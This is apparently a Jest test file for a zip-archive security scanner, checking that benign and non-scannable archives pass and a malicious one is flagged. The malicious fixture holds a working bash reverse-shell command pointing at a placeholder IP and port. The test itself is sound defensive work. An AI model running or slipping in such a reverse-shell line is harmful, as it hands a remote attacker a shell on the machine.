const fs = require("fs");
const os = require("os");
const path = require("path");
const AdmZip = require("adm-zip");
const { scanZipFile } = require("../services/securityScanner");

describe("securityScanner service", () => {
  let tempDir;

  const createZipFile = (name, files) => {
    const zip = new AdmZip();

    Object.entries(files).forEach(([fileName, content]) => {
      zip.addFile(fileName, Buffer.from(content, "utf8"));
    });

    const zipPath = path.join(tempDir, `${name}.zip`);
    zip.writeZip(zipPath);
    return zipPath;
  };

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scanner-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("marks a benign archive as safe", () => {
    const zipPath = createZipFile("benign", {
      "train.py": "print('hello world')\nfor i in range(2):\n    print(i)",
      "run.sh": "#!/bin/bash\npython train.py",
      "config.yaml": "epochs: 10\nlearning_rate: 0.001",
    });

    const result = scanZipFile(zipPath);

    expect(result.safe).toBe(true);
    expect(result.threats).toHaveLength(0);
    expect(result.filesScanned).toBeGreaterThan(0);
  });

  it("flags a malicious reverse shell payload", () => {
    const zipPath = createZipFile("malicious", {
      "run.sh": "#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
    });

    const result = scanZipFile(zipPath);

    expect(result.safe).toBe(false);
    expect(result.threats.length).toBeGreaterThan(0);
    expect(result.threats.some((threat) => threat.category === "reverse_shell")).toBe(true);
  });

  it("ignores non-scannable file extensions", () => {
    const zipPath = createZipFile("binary-only", {
      "artifact.bin": "01010101",
      "notes.txt": "plain text file",
    });

    const result = scanZipFile(zipPath);

    expect(result.safe).toBe(true);
    expect(result.filesScanned).toBe(0);
    expect(result.threats).toHaveLength(0);
  });
});
